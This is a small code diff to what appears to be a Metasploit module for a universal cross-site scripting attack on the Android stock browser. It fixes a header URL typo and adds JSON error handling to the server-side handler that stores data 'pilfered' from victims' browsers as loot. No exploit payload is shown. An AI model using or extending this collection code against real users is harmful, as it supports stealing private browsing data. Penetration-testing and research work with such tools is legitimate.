@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -114,12 +114,17 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def collect_data(request)
-    response = JSON.parse(request.body)
-    url = response['url']
-    if response && url
-      file = store_loot("android.client", "text/plain", cli.peerhost, request.body, "aosp_uxss_#{url}", "Data pilfered from uxss")
-      print_good "Collected data from URL: #{url}"
-      print_good "Saved to: #{file}"
+    begin
+      response = JSON.parse(request.body)
+    rescue JSON::ParserError
+      print_bad "Invalid JSON request."
+    else
+      url = response['url']
+      if response && url
+        file = store_loot("android.client", "text/plain", cli.peerhost, request.body, "aosp_uxss_#{url}", "Data pilfered from uxss")
+        print_good "Collected data from URL: #{url}"
+        print_good "Saved to: #{file}"
+      end
     end
   end
 
